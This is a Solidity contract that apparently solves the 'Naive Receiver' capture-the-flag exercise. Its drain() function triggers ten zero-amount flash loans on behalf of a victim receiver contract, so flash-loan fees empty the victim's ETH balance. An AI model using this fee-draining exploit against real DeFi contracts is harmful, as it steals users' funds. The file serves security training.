pragma solidity ^0.8.0;

import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";

interface INaiveReceiverLenderPool {
    function flashLoan(
        IERC3156FlashBorrower receiver,
        address token,
        uint256 amount,
        bytes calldata data
    ) external returns (bool);
}

contract NaiveReceiverDrainer {
    IERC3156FlashBorrower receiver;
    INaiveReceiverLenderPool private pool;
    address private ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;

    constructor(address lenderPoolAddress, address receiverAddress) {
        pool = INaiveReceiverLenderPool(lenderPoolAddress);
        receiver = IERC3156FlashBorrower(receiverAddress);
    }

    function drain() public {
        for (uint256 i = 0; i < 10; i++) {
            pool.flashLoan(receiver, ETH, 0, "");
        }
    }


}

